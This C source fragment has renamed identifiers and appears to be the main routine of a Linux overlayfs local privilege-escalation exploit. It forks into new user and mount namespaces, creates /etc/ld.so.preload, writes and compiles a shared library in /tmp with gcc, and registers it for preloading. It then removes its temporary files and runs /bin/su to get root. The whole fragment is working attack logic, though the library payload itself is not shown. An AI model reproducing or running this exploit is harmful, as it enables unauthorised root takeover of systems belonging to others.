
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef scalar_t__ pid_t ;


 int VAR_0 ;
 int VAR_1 ;
 char* VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 scalar_t__ VAR_7 ;
 scalar_t__ FUNC_0 (int ,scalar_t__,int,int *) ;
 int FUNC_1 (int) ;
 int FUNC_2 (char*,char*,int *) ;
 int FUNC_3 (int) ;
 scalar_t__ FUNC_4 () ;
 int FUNC_5 (int ,char*) ;
 int FUNC_6 (char*,int,...) ;
 int VAR_8 ;
 int FUNC_7 (char*) ;
 int FUNC_8 (char*) ;
 scalar_t__ FUNC_9 (int ) ;
 int FUNC_10 (int) ;
 int FUNC_11 (int *) ;
 int FUNC_12 (scalar_t__,int*,int ) ;
 int FUNC_13 (int,char*,int) ;

int
FUNC_14(int VAR_9, char **VAR_10)
{
    int VAR_11, VAR_12, VAR_13;
    pid_t VAR_14, VAR_15;
    int VAR_16 = VAR_0 | VAR_5;

    FUNC_5(VAR_8,"spawning threads\n");

    if((VAR_14 = FUNC_4()) == 0) {
        if(FUNC_9(VAR_1) != 0)
            FUNC_5(VAR_8, "failed to create new user namespace\n");

        if((VAR_15 = FUNC_4()) == 0) {
            pid_t VAR_17 =
                FUNC_0(VAR_6, VAR_7 + (1024*1024), VAR_16, ((void*)0));
            if(VAR_17 < 0) {
                FUNC_5(VAR_8, "failed to create new mount namespace\n");
                FUNC_3(-1);
            }

            FUNC_12(VAR_17, &VAR_11, 0);

        }

        FUNC_12(VAR_15, &VAR_11, 0);
        return 0;
    }

    FUNC_10(300000);

    FUNC_11(((void*)0));

    FUNC_5(VAR_8,"child threads done\n");

    VAR_12 = FUNC_6("/etc/ld.so.preload",VAR_4);

    if(VAR_12 == -1) {
        FUNC_5(VAR_8,"exploit failed\n");
        FUNC_3(-1);
    }

    FUNC_5(VAR_8,"/etc/ld.so.preload created\n");
    FUNC_5(VAR_8,"creating shared library\n");
    VAR_13 = FUNC_6("/tmp/ofs-lib.c",VAR_3|VAR_4,0777);
    FUNC_13(VAR_13,VAR_2,FUNC_7(VAR_2));
    FUNC_1(VAR_13);
    VAR_13 = FUNC_8("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
    if(VAR_13 != 0) {
        FUNC_5(VAR_8,"couldn't create dynamic library\n");
        FUNC_3(-1);
    }
    FUNC_13(VAR_12,"/tmp/ofs-lib.so\n",16);
    FUNC_1(VAR_12);
    FUNC_8("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
    FUNC_2("/bin/su","su",((void*)0));
}
